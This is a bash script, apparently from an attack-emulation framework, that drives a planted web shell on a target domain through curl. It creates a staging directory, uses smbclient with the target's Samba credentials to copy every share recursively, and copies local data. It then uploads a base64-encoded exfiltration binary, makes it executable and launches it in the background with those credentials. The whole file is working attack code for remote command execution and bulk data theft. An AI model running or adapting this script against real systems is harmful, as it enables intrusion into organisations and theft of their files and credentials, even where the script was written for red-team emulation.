#!/bin/bash

echo "Loading configs/$1"
source configs/$1

SHELL_COMMAND="curl https://${TARGET_CLOUD_DOMAIN}/${WEBSHELL_NAME}?feature=shell"
UPLOAD_COMMAND="curl https://${TARGET_CLOUD_DOMAIN}/${WEBSHELL_NAME}?feature=upload"

$SHELL_COMMAND -d "cwd=.&cmd=mkdir+-p+$EXFIL_DIR"

i=0
for share in $TARGET_SAMBA_SHARES
do
    attack_wait $(shuf -i 0-20 -n 1)s
    echo "Copying files from //$TARGET_SAMBA_SHARE/$share to ${i}_${share} ..."
    $SHELL_COMMAND -d "cwd=$EXFIL_DIR&cmd=mkdir+-p+${i}_${share}"
    $SHELL_COMMAND -d "cwd=$EXFIL_DIR&cmd=smbclient+-U+$TARGET_SAMBA_USER%25$TARGET_SAMBA_PW+-c+%22lcd+${i}_${share};+recurse+ON;+prompt+OFF;mask+*;+mget+*%22+//$TARGET_SAMBA_SHARE/$share"
    ((i=i+1))
    echo "done."
done

echo "Copying other shares ..."
$SHELL_COMMAND -d "cwd=$EXFIL_DIR&cmd=cp+/mnt/data/local/*+.+-r"

echo "Create exfiltration script ..."

$SHELL_COMMAND -d "cwd=.&cmd=mkdir+-p+$EXFIL_SERVICE_DIR"
attack_wait $(shuf -i 0-20 -n 1)s

# need to convert + to urlencoded %2B
exfil_bin=$(base64 -w 0 $EXFIL_SERVICE_BIN_SRC | sed 's/\+/%2B/g')
$UPLOAD_COMMAND -d "cwd=.&path=$EXFIL_SERVICE_BIN&file=$exfil_bin"
attack_wait $(shuf -i 0-20 -n 1)s

$SHELL_COMMAND -d "cwd=.&cmd=chmod+%2Bx+$EXFIL_SERVICE_BIN"
attack_wait $(shuf -i 0-20 -n 1)s

$SHELL_COMMAND -d "cwd=.&cmd=nohup+$EXFIL_SERVICE_BIN+$EXFIL_SERVICE_ID+$TARGET_SAMBA_SHARE+$TARGET_SAMBA_USER+$TARGET_SAMBA_PW+>+/dev/null+2>%261+%26"

echo "done."
